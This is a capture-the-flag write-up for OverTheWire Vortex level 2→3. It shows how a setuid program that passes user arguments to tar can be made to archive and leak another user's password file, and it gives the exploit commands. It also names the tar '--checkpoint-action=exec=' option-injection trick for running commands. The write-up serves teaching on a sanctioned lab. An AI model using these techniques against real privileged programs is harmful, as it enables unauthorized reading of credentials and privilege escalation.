# OverTheWire — Vortex Level 2 → 3

> Goal: Get `vortex3`'s password from `vortex2`. Result: **`**********`** (redacted)
> Technique: a setuid program passes user arguments to `tar` as operands → make tar (euid=vortex3) **archive the password file**, then extract from the group-readable archive.
> Environment: 32-bit x86 setuid (vortex3); the vulnerability is not memory, but an **unsafe subprocess call**.

---

## 1. Connection
```bash
ssh vortex2@vortex.labs.overthewire.org -p 2228   # password: taken from vortex1
```
`/vortex/vortex2` → `-r-sr-x---  vortex3 vortex2` (setuid vortex3). No source → `objdump` + `strings` (seen: `/bin/tar`, `/tmp/ownership.$$.tar`).

## 2. Analysis (`objdump` → pseudo-code)
```c
int main(int argc, char **argv) {
    char *args[6];
    args[0] = "/bin/tar";
    args[1] = "cf";
    args[2] = "/tmp/ownership.$$.tar";   // FIXED path — execv, NO shell → $$ does not expand, literal
    args[3] = argv[1];                    // ← user-controlled
    args[4] = argv[2];                    // ← user-controlled
    args[5] = argv[3];                    // ← user-controlled
    execv("/bin/tar", args);              // tar cf /tmp/ownership.$$.tar <argv1> <argv2> <argv3>
}
```

## 3. The Vulnerability
- The program passes the user's `argv[1..3]` **directly** to `tar` as operands, and tar runs with **euid=vortex3** (setuid).
- You tell tar "which files to archive" → tar can read those files **with vortex3's privileges**.
- The resulting archive `/tmp/ownership.$$.tar`: owner vortex3, but **mode `-rw-rw-r--`, group vortex2** → we (vortex2, group vortex2) **can read it**.
- Idea: make tar **archive the password file** → its contents end up in the archive → read the archive and extract them.

> 💡 **Two tar paths:** (A) archiving the password file [the one I used, cleanest]; (B) the classic tar **`--checkpoint-action=exec=`** command injection (tar mistakes a `--`-prefixed operand for an option). B is the path the level's "GNU tar manual" hint points to, but it has two snags: enough **records** are needed for the checkpoint to fire, and because the action runs via `sh -c`, **privileges may drop**. A sidesteps both.

## 4. Exploit (A — make tar archive the password file)
```bash
cd /tmp
/vortex/vortex2 /etc/vortex_pass/vortex3     # → tar cf /tmp/ownership.$$.tar /etc/vortex_pass/vortex3
tar xOf '/tmp/ownership.$$.tar'              # dump the archive's contents to stdout (x=extract, O=stdout, f=file)
```
Output:
```
/bin/tar: Removing leading `/' from member names     # (tar's normal warning)
**********
```
Verification: `tar tvf '/tmp/ownership.$$.tar'` → `-r-------- vortex3/vortex3 ... etc/vortex_pass/vortex3` (tar read the file as vortex3).

> ⚠️ **SIGPIPE trap (came up in the live solve):** if you pipe the program's output into something like `| head`, then when the pipe closes early `tar` dies with **SIGPIPE** and leaves a half/stale archive behind (old `mtime`, empty contents). Run the program **without a pipe**, and read the archive separately afterwards.

> ⚠️ **fixed output path:** `/tmp/ownership.$$.tar` is literal (execv, `$$` does not expand). The file is owned by vortex3; in sticky `/tmp` you **cannot delete** it, but tar (euid vortex3) **can overwrite** it, and since it is group-`rw` **you can read** it.

## Lessons
| Topic | Note |
|------|------|
| Unsafe subprocess | Passing a user argument to a privileged program (tar) without filtering = privesc |
| Confused deputy | The setuid program reads files on your behalf with vortex3's privileges (a continuation of the [[vortex1]] setuid logic) |
| tar = file-read primitive | Controlling "what to archive" = controlling "which file to read as vortex3" |
| Group permissions | Output is `-rw-rw-r--` group vortex2 → we can read the archive and extract the contents |
| `tar xOf` | Dumps an archive member to **stdout** without unpacking it to disk → quick content read |
| tar checkpoint trick | `--checkpoint-action=exec=CMD` = classic tar RCE; but the record + `sh -c` privilege drop make it fiddly |
| SIGPIPE | Closing a `| head` pipe early while the subprocess is writing → SIGPIPE → truncated output |
| execv vs system | execv opens no shell → `$$` stays literal; but argument injection is still possible |
